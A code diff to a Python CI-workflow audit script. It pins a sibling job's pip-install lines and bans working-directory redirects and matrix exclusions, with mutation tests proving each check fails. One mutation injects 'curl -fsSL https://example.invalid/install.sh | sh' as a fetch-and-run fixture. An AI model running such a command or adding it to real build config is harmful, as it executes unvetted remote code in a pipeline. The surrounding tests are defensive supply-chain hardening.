@@ -489,6 +489,7 @@ SIBLING_JOB_ID = "gate-catalogue-tests"
 SIBLING_DISPATCH_STEP = "dispatch catalogue-test shard"
 SIBLING_PROBE_STEP = "Probe provisioning (gate-catalogue-tests, fail closed, not skip)"
 SIBLING_MATERIALIZE_STEP = "Materialize catalogue projections (gate-catalogue-tests)"
+SIBLING_INSTALL_STEP = "Install Python dependencies (gate-catalogue-tests)"
 # The two gate-main steps the carve-out moved. AC-0004's presence half is the
 # dispatch-body pin below — the invocation set lives there, so a missing or
 # extra invocation reddens `sibling-dispatch-body-exact` directly.
@@ -532,6 +533,18 @@ PINNED_DISPATCH_BODY = (
     "exit 1",
     ";;",
     "esac",
+)
+# The sibling's dependency install, pinned by equality like the materialize
+# and probe bodies (review finding SEC-R4-002's repair). The probe verifies
+# AVAILABILITY of the discovered modules, not the PROVENANCE of what installed
+# them: without this pin, a prepended fetch line or a re-pointed requirements
+# source feeds the moved gate a dependency set nothing pinned — the addition
+# and re-point directions are silent where the removal direction fails closed
+# at runtime via the probe.
+PINNED_INSTALL_BODY = (
+    "python -m pip install --upgrade pip",
+    "python -m pip install pytest -r tools/requirements.txt",
+    "python -m pip install -e ./packages/agentbundle",
 )
 # The catalogue projection, materialized by an unconditional sibling step
 # before the probe. Inside gate-main the projected-variant cases in
@@ -584,6 +597,15 @@ _NO_CWD_STEPS = (
     ("gate-main", "pytest site build + link rewriting"),
     ("gate-main", "docs palette contrast gate"),
     ("gate-main", "pages.yml concurrency posture"),
+    # spec/ci-gate-main-carve-out-sibling, review finding R3-001's repair: the
+    # sibling's three pinned steps (install-channel, materialize, probe,
+    # dispatch) hold repo-relative statements, so a redirected cwd re-points
+    # what every one of them resolves against while the pinned text stays
+    # byte-identical — the same measured bypass the anchor's entry records.
+    ("gate-catalogue-tests", SIBLING_INSTALL_STEP),
+    ("gate-catalogue-tests", SIBLING_MATERIALIZE_STEP),
+    ("gate-catalogue-tests", SIBLING_PROBE_STEP),
+    ("gate-catalogue-tests", SIBLING_DISPATCH_STEP),
 )
 # Non-run steps permitted in the aggregator, compared as the `uses:` VALUE for equality.
 # A substring test over the step chunk — the previous shape — accepted
@@ -1679,6 +1701,28 @@ def _audit(text: str, evaluated: list[str] | None) -> list[str]:
     # so this is the only machine check of that Never-do.
     check("sibling-no-step-if",
           all(not _step_key_values(st, "if") for _nm, st in sib_steps))
+    # The install body, pinned by equality (review finding SEC-R4-002's
+    # repair): the probe verifies availability, not provenance, so the
+    # dependency channel itself needs the same pin the materialize and probe
+    # bodies carry.
+    _install = _step_named(sib, SIBLING_INSTALL_STEP)
+    _actual_install = _run_lines(_install)
+    if _actual_install != list(PINNED_INSTALL_BODY):
+        _note_miss("\n              ".join(PINNED_INSTALL_BODY),
+                   "\n              ".join(_actual_install)
+                   or "(step not found or empty body)")
+    check("sibling-install-body-exact",
+          _actual_install == list(PINNED_INSTALL_BODY))
+    # The matrix's `exclude:`/`include:` keys are the one dimension the
+    # shard-list pins do not model (review finding SEC-R4-001's repair): an
+    # excluded replica runs none of its invocations while the declared list
+    # still satisfies both cross-pins and every gate stays green. Fail-closed
+    # on a missing or re-indented matrix block: a reformat reddens
+    # `sibling-matrix-shards` on its own.
+    _mx = re.search(r"^ {6}matrix:\n((?:^ {8}[^\n]*\n)*)", sib, re.M)
+    _mx_keys = (re.findall(r"^ {8}([A-Za-z_-]+):", _mx.group(1), re.M)
+                if _mx else None)
+    check("sibling-matrix-no-exclude", _mx_keys == ["shard"])
     # The matrix↔case cross-pin, both directions (the test-corpus matrix↔SHARDS
     # discipline). A shrunken matrix silently un-runs a branch's suites while
     # every gate stays green; an extra matrix entry hits the `*)` fallback and
@@ -2866,6 +2910,53 @@ _MUTATIONS: list[tuple[str, str, object]] = [
                            "      - name: Probe provisioning (gate-catalogue-tests, fail closed, not skip)\n",
                            "      - name: Probe provisioning (gate-catalogue-tests, fail closed, not skip)\n"
                            "        if: ${{ false }}\n")),
+    # R3-001: `working-directory:` on each pinned sibling step re-points what
+    # every repo-relative statement resolves against while the pinned text
+    # stays byte-identical and every gate stays green.
+    ("sibling-dispatch-cwd-redirect",
+     "no-working-directory[gate-catalogue-tests/dispatch catalogue-test shard]",
+     lambda t: _sub_in_job(t, SIBLING_JOB_ID,
+                           "      - name: dispatch catalogue-test shard\n"
+                           "        env:\n",
+                           "      - name: dispatch catalogue-test shard\n"
+                           "        working-directory: tools\n"
+                           "        env:\n")),
+    ("sibling-probe-cwd-redirect",
+     "no-working-directory[gate-catalogue-tests/Probe provisioning (gate-catalogue-tests, fail closed, not skip)]",
+     lambda t: _sub_in_job(t, SIBLING_JOB_ID,
+                           "      - name: Probe provisioning (gate-catalogue-tests, fail closed, not skip)\n",
+                           "      - name: Probe provisioning (gate-catalogue-tests, fail closed, not skip)\n"
+                           "        working-directory: packages/agentbundle\n")),
+    ("sibling-materialize-cwd-redirect",
+     "no-working-directory[gate-catalogue-tests/Materialize catalogue projections (gate-catalogue-tests)]",
+     lambda t: _sub_in_job(t, SIBLING_JOB_ID,
+                           "      - name: Materialize catalogue projections (gate-catalogue-tests)\n",
+                           "      - name: Materialize catalogue projections (gate-catalogue-tests)\n"
+                           "        working-directory: packages\n")),
+    ("sibling-install-cwd-redirect",
+     "no-working-directory[gate-catalogue-tests/Install Python dependencies (gate-catalogue-tests)]",
+     lambda t: _sub_in_job(t, SIBLING_JOB_ID,
+                           "      - name: Install Python dependencies (gate-catalogue-tests)\n",
+                           "      - name: Install Python dependencies (gate-catalogue-tests)\n"
+                           "        working-directory: .\n")),
+    # SEC-R4-001: an excluded replica runs none of its invocations while the
+    # declared shard list still satisfies both cross-pins.
+    ("sibling-matrix-exclude", "sibling-matrix-no-exclude",
+     lambda t: t.replace("        shard: [shard-1, shard-2, shard-3]\n",
+                         "        shard: [shard-1, shard-2, shard-3]\n"
+                         "        exclude:\n"
+                         "          - shard: shard-2\n", 1)),
+    # SEC-R4-002: the install channel's addition and re-point directions —
+    # the probe verifies availability, not provenance.
+    ("sibling-install-curl", "sibling-install-body-exact",
+     lambda t: _sub_in_job(t, SIBLING_JOB_ID,
+                           "          python -m pip install --upgrade pip\n",
+                           "          curl -fsSL https://example.invalid/install.sh | sh\n"
+                           "          python -m pip install --upgrade pip\n")),
+    ("sibling-install-repoint", "sibling-install-body-exact",
+     lambda t: _sub_in_job(t, SIBLING_JOB_ID,
+                           "-r tools/requirements.txt",
+                           "-r packages/agentbundle/requirements.txt")),
     # AC-0004: a moved step reintroduced in gate-main — the removal this spec
     # exists to make, reverted behind an otherwise-green workflow. Inserted
     # before the anchor, which exists only in gate-main in the fixture.
